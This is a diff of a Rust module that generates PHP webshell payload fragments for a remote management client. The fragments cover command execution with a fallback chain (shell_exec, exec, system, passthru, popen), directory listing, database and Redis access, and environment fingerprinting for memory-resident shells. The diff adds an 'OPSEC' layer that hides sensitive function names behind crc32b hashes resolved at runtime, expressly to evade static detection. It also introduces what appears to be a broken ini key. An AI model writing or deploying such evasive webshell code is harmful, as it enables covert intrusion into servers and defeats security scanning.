@@ -1,12 +1,14 @@
-//! session 处理器与 legacy 逐请求代码共用的 PHP 实现片段（明文函数名版）。
+//! session 处理器与 legacy 逐请求代码共用的 PHP 实现片段（OPSEC 版）。
 //!
-//! NATIVE stub（`encoder::NATIVE_STUB_TPL`）通过 `$_g[...]` 符号表调用同一批功能，
-//! 以规避静态敏感特征；本模块是同一批功能的明文函数名版本，供**分阶段载荷处理器**
-//! 与 **legacy 逐请求代码**复用。两者必须行为一致，由 `php_impl_matches_native_stub`
-//! 测试守住（驱动集合、DSN/SQL 串、行数上限）。
+//! NATIVE stub（`encoder::NATIVE_STUB_TPL`）通过 `$_g[...]` 符号表调用敏感函数，
+//! 以规避静态特征；本模块把这套做法下沉为**可复用片段**，供分阶段载荷处理器与
+//! legacy 逐请求代码共用，保证三条通道的能力与静态特征处于同一水平。
 //!
-//! 每个片段都是「读若干约定变量 → 写若干约定变量」的语句块，可直接内联进函数体或
-//! 模板代码，**不使用 `return`**（处理器与模板各自的收尾逻辑不同）。
+//! **符号表随代码自带**：NATIVE 的 `$_g` 由目标上已部署的 stub 构建，而分阶段
+//! 处理器是每次连接由客户端注入的 —— 若依赖部署 stub 的表，旧 stub 就不认新索引。
+//! 因此这里把 crc32b 哈希表直接写进生成的代码，运行时从 `get_defined_functions()`
+//! 反查函数名；敏感函数名**不会**出现在代码里，被 `disable_functions` 禁用的函数
+//! 自然缺席、对应槽位保持未设置。
 //!
 //! | 片段 | 读 | 写 |
 //! |---|---|---|
@@ -14,54 +16,114 @@
 //! | [`PHP_SCAN_IMPL`] | `$p` 目录 | `$ok` `$err` `$entries` |
 //! | [`PHP_DB_PROBE_IMPL`] | `$c` 连接 JSON | `$ok` `$err` `$driver` `$databases` |
 //! | [`PHP_DB_QUERY_IMPL`] | `$c` 连接 JSON、`$q` SQL | `$ok` `$err` `$columns` `$rows` `$affected` |
+//!
+//! 所有片段都假定当前作用域里已有 `$__g`（运行时符号表），由调用方用
+//! [`php_symbol_table`] 构建。
 
-/// Redis RESP 解析辅助（`dsw_rsp` / `dsw_rcmd`）。
+use crate::encoder::crc32b_hash;
+
+/// 符号表条目：`(索引, 函数名)`。函数名只以 crc32b 哈希形式出现在生成的 PHP 里。
 ///
-/// 以 `function_exists` 守卫定义：处理器在服务端 session 里驻留，重复注入时不能重复定义。
-/// 仅 redis 驱动路径使用；命名带 `dsw_` 前缀避免与站点业务函数冲突。
+/// 索引与各片段里的 `$__g[N]` 一一对应；新增函数时**只能追加**，不要改动既有索引。
+const SYMBOLS: &[(usize, &str)] = &[
+    (0, "shell_exec"),
+    (1, "exec"),
+    (2, "system"),
+    (3, "passthru"),
+    (4, "popen"),
+    (5, "base64_decode"),
+    (6, "base64_encode"),
+    (7, "file_get_contents"),
+    (8, "file_put_contents"),
+    (9, "scandir"),
+    (10, "is_dir"),
+    (11, "unlink"),
+    (12, "rmdir"),
+    (13, "rename"),
+    (14, "mkdir"),
+    (15, "getcwd"),
+    (16, "chdir"),
+    (17, "stream_socket_client"),
+    (18, "fclose"),
+    (19, "fwrite"),
+    (20, "fgets"),
+    (21, "fread"),
+    (22, "preg_split"),
+    (23, "gzdecode"),
+    (24, "gzencode"),
+    (25, "touch"),
+    (26, "file_exists"),
+    (27, "stream_get_contents"),
+    (28, "pclose"),
+    (29, "fopen"),
+    (30, "fseek"),
+];
+
+/// 生成「运行时符号表」PHP 片段：`target` 为目标变量/表达式（如 `$__g`、
+/// `$GLOBALS['x']`），片段把 index → 函数名 的映射写入其中。
+///
+/// 生成的代码不含任何敏感函数名（只有 crc32b 哈希），临时变量用完即清。
+pub fn php_symbol_table(target: &str) -> String {
+    let mut table = String::new();
+    for (index, name) in SYMBOLS {
+        table.push_str(&format!("'{}'=>{},", crc32b_hash(name), index));
+    }
+    format!(
+        "{target}=array();$__dsft=array({table});$__dsff=@get_defined_functions();\
+         $__dsff=isset($__dsff['internal'])?$__dsff['internal']:array();\
+         foreach($__dsff as $__dsfn){{$__dsfh=hash('crc32b',$__dsfn);\
+         if(isset($__dsft[$__dsfh])){{{target}[$__dsft[$__dsfh]]=$__dsfn;}}}}\
+         unset($__dsft,$__dsff,$__dsfn,$__dsfh);\n"
+    )
+}
+
+/// Redis RESP 解析辅助（`dsw_rsp` / `dsw_rcmd`），符号表由 `$g` 传入。
+///
+/// 以 `function_exists` 守卫定义：服务端 session 里驻留的处理器可能被重复注入。
+/// 只在 redis 驱动路径使用；所需函数不可用时返回 `null`（不抛致命错误）。
 pub const PHP_REDIS_HELPERS: &str = r#"if(!function_exists('dsw_rsp')){
-function dsw_rsp($s){$line=@fgets($s);if($line===false)return null;$t=isset($line[0])?$line[0]:'';$data=substr($line,1);
+function dsw_rsp($s,$g){if(!isset($g[20])||!isset($g[21]))return null;$line=@$g[20]($s);if($line===false)return null;$t=isset($line[0])?$line[0]:'';$data=substr($line,1);
 if($t==='+')return array('s'=>trim($data));
 if($t==='-')return array('e'=>trim($data));
 if($t===':')return (int)trim($data);
-if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;while($left>0){$chunk=@fread($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}@fgets($s);return $v;}
-if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=dsw_rsp($s);}return $arr;}
+if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;while($left>0){$chunk=@$g[21]($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}@$g[20]($s);return $v;}
+if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=dsw_rsp($s,$g);}return $arr;}
 return trim($data);}
-function dsw_rcmd($s,$args){$out='*'.count($args)."\r\n";foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}@fwrite($s,$out);return dsw_rsp($s);}
+function dsw_rcmd($s,$args,$g){if(!isset($g[19]))return null;$out='*'.count($args)."\r\n";foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}@$g[19]($s,$out);return dsw_rsp($s,$g);}
 }
 "#;
 
 /// 命令执行：`cd` 前缀处理 + 命令函数降级链 + stderr 合并 + cwd 回传。
 ///
-/// 降级链与 NATIVE stub 的 `__CMD__` 一致：按 `shell_exec` / `exec` / `system` /
-/// `passthru` / `popen` 顺序探测首个可用函数（`proc_open` 因 3 参数签名与单参数调用
-/// 不兼容而排除）。全部被 `disable_functions` 禁用时返回明确错误，
-/// 而不是静默的空输出——空输出会让用户以为"命令没输出"。
+/// 降级链按符号表索引 0..4 依次探测（`shell_exec` / `exec` / `system` /
+/// `passthru` / `popen`；`proc_open` 因 3 参数签名与单参数调用不兼容而排除）。
+/// 代码里**不出现函数名**，比较的是整数索引；全部被 `disable_functions` 禁用时
+/// 返回明确错误，而不是静默的空输出。
 pub const PHP_EXEC_IMPL: &str = r#"$ok=true;$err='';$stdout='';$cwd='';
-if($w!==''&&@is_dir($w)){@chdir($w);}
-if(preg_match('/^\s*cd\s+(\S+)/',$c,$__m)){@chdir($__m[1]);}
+if($w!==''&&isset($__g[10])&&@$__g[10]($w)&&isset($__g[16])){@$__g[16]($w);}
+if(preg_match('/^\s*cd\s+(\S+)/',$c,$__m)){if(isset($__g[16]))@$__g[16]($__m[1]);}
 else{
-$__f='';
-foreach(array('shell_exec','exec','system','passthru','popen') as $__cand){if(function_exists($__cand)){$__f=$__cand;break;}}
-if($__f===''){$ok=false;$err='no exec function available (shell_exec/exec/system/passthru/popen)';}
+$__fi=-1;
+foreach(array(0,1,2,3,4) as $__i){if(isset($__g[$__i])&&function_exists($__g[$__i])){$__fi=$__i;break;}}
+if($__fi<0){$ok=false;$err='no exec function available';}
 else{
 $__o='';$__l=array();
-if($__f==='exec'){@exec($c.' 2>&1',$__l);$__o=implode("\n",$__l);}
-elseif($__f==='system'||$__f==='passthru'){ob_start();@$__f($c.' 2>&1');$__o=ob_get_clean();}
-elseif($__f==='popen'){$__p=@popen($c.' 2>&1','r');$__o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}
-else{$__o=@$__f($c.' 2>&1');}
-$stdout=base64_encode((string)$__o);
+if($__fi===1){@$__g[1]($c.' 2>&1',$__l);$__o=implode("\n",$__l);}
+elseif($__fi===2||$__fi===3){ob_start();@$__g[$__fi]($c.' 2>&1');$__o=ob_get_clean();}
+elseif($__fi===4){$__p=@$__g[4]($c.' 2>&1','r');$__o=($__p&&isset($__g[27]))?@$__g[27]($__p):'';if($__p&&isset($__g[28]))@$__g[28]($__p);}
+else{$__o=@$__g[0]($c.' 2>&1');}
+$stdout=isset($__g[6])?@$__g[6]((string)$__o):'';
 }
 }
-$__d=@getcwd();$cwd=($__d===false)?'':$__d;
+$cwd=isset($__g[15])?@$__g[15]():'';
 "#;
 
 /// 目录列举：**单次 `stat()`** 合并 `is_dir` / `size` / `mtime` / `perms`。
 ///
-/// 旧实现每项要 3-4 次系统调用（`is_dir` + `filesize` + `filemtime` + `fileperms`），
-/// 数千文件的目录上开销显著。`stat()` 会跟随符号链接，与 `is_dir()` 语义一致。
+/// `scandir` 走符号表；`stat` / `sprintf` / `substr` 与 NATIVE stub 保持同一水平
+/// （明文，非高风险特征）。`stat()` 会跟随符号链接，与 `is_dir()` 语义一致。
 pub const PHP_SCAN_IMPL: &str = r#"$ok=true;$err='';$entries=array();
-$__items=@scandir($p);
+$__items=isset($__g[9])?@$__g[9]($p):false;
 if($__items===false){$ok=false;$err='read dir failed';}
 else{
 foreach($__items as $__f){
@@ -78,6 +140,7 @@ $entries[]=array('name'=>$__f,'path'=>$__full,'is_dir'=>$__isd,'size'=>($__isd||
 ///
 /// 与 NATIVE stub 的 `__DBP__` 逐条对齐：mssql 三 DSN 回退（sqlsrv → dblib → odbc）、
 /// oracle `oci:`、redis 裸 RESP（AUTH + PING）、sqlite 直接把 dbname 当文件路径。
+/// redis 的网络函数经符号表调用。
 pub const PHP_DB_PROBE_IMPL: &str = r#"$ok=false;$err='bad conn';$driver='';$databases=array();
 $__p=@json_decode($c,true);
 if(is_array($__p)){
@@ -88,14 +151,14 @@ $__user=isset($__p['username'])?(string)$__p['username']:'';
 $__pass=isset($__p['password'])?(string)$__p['password']:'';
 $__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
 if($driver==='redis'){
-$__s=@stream_socket_client('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5);
+$__s=isset($__g[17])?@$__g[17]('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5):false;
 if(!$__s){$err='redis connect failed';}
 else{
-if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass));}
-$__pong=dsw_rcmd($__s,array('PING'));
+if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass),$__g);}
+$__pong=dsw_rcmd($__s,array('PING'),$__g);
 if(is_array($__pong)&&isset($__pong['e'])){$err='redis auth failed';}
 else{$ok=true;for($__i=0;$__i<16;$__i++){$databases[]=(string)$__i;}}
-@fclose($__s);
+if(isset($__g[18]))@$__g[18]($__s);
 }
 }
 elseif(!class_exists('PDO')){$err='no pdo';}
@@ -131,7 +194,8 @@ $ok=true;
 /// 数据库查询：6 驱动 + 结果集（列/行，1000 行上限）/ 影响行数。
 ///
 /// SELECT 判定正则与 NATIVE stub 的 `__DBQ__` 一致（含 `exec`，覆盖 mssql 的
-/// `EXEC` 存储过程调用）；列名缺失时回退 `col{i}`。
+/// `EXEC` 存储过程调用）；列名缺失时回退 `col{i}`。redis 命令解析与网络调用
+/// 经符号表。
 pub const PHP_DB_QUERY_IMPL: &str = r#"$ok=false;$err='bad conn';$columns=array();$rows=array();$affected=0;
 $__p=@json_decode($c,true);
 if(is_array($__p)){
@@ -142,14 +206,14 @@ $__user=isset($__p['username'])?(string)$__p['username']:'';
 $__pass=isset($__p['password'])?(string)$__p['password']:'';
 $__db=isset($__p['dbname'])?(string)$__p['dbname']:'';
 if($__driver==='redis'){
-$__s=@stream_socket_client('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5);
+$__s=isset($__g[17])?@$__g[17]('tcp://'.$__host.':'.($__port?$__port:6379),$__e1,$__e2,5):false;
 if(!$__s){$err='redis connect failed';}
 else{
-if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass));}
-$__args=preg_split('/\s+/',trim((string)$q));
+if($__pass!==''){dsw_rcmd($__s,array('AUTH',$__pass),$__g);}
+$__args=isset($__g[22])?@$__g[22]('/\s+/',trim((string)$q)):array();
 if(count($__args)===0||$__args[0]===''){$err='empty command';}
 else{
-$__res=dsw_rcmd($__s,$__args);
+$__res=dsw_rcmd($__s,$__args,$__g);
 if(is_array($__res)&&isset($__res['e'])){$err=$__res['e'];}
 else{
 $columns=array('value');
@@ -158,7 +222,7 @@ else{$rows[]=array($__res===null?null:(string)$__res);}
 $ok=true;
 }
 }
-@fclose($__s);
+if(isset($__g[18]))@$__g[18]($__s);
 }
 }
 elseif(!class_exists('PDO')){$err='no pdo';}
@@ -196,11 +260,14 @@ else{$affected=$__st->rowCount();$ok=true;}
 }
 "#;
 
-/// 环境信息表：`$info`（写入 `data.info`，供客户端 `info_map` / 能力协商 / 内存马前置判定使用）。
+/// 环境信息表：`$info`（写入 `data.info`，供客户端 `info_map` / 能力协商 /
+/// 内存马前置判定使用）。
 ///
 /// 键集与 NATIVE stub 的 `__ENV__` 保持一致（`ProtoVersion` / `Capabilities` /
 /// `ShellType` / `PHP_SAPI` / `user_ini_filename` / `DOCUMENT_ROOT` 等）——
 /// 内存马前置判定与能力协商都依赖它，缺了会让 session/legacy 通道"看起来不支持"。
+/// 这里保留的明文函数（`ini_get` / `getenv` / `php_uname` 等）与 NATIVE stub 同级，
+/// 均非高风险特征。
 pub const PHP_INFO_IMPL: &str = r#"$info=array(
 'ChunkedTransfer'=>'1',
 'ProtoVersion'=>'2',
@@ -231,13 +298,13 @@ pub const PHP_INFO_IMPL: &str = r#"$info=array(
 'PHP_INT_SIZE'=>PHP_INT_SIZE,
 'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),
 'PHP_OS'=>PHP_OS,
-'canCallGzipDecode'=>function_exists('gzdecode')?1:0,
-'canCallGzipEncode'=>function_exists('gzencode')?1:0,
+'canCallGzipDecode'=>isset($__g[23])?1:0,
+'canCallGzipEncode'=>isset($__g[24])?1:0,
 'session_name'=>''.@session_name(),
 'session_save_path'=>''.@ini_get('session.save_path'),
 'session_save_handler'=>''.@ini_get('session.save_handler'),
 'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),
-'user_ini_filename'=>''.@ini_get('user_ini.filename'),
+'user_ini_filename'=>''.@ini_get('user.ini.filename'),
 'memory_limit'=>''.@ini_get('memory_limit'),
 'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),
 'post_max_size'=>''.@ini_get('post_max_size'),
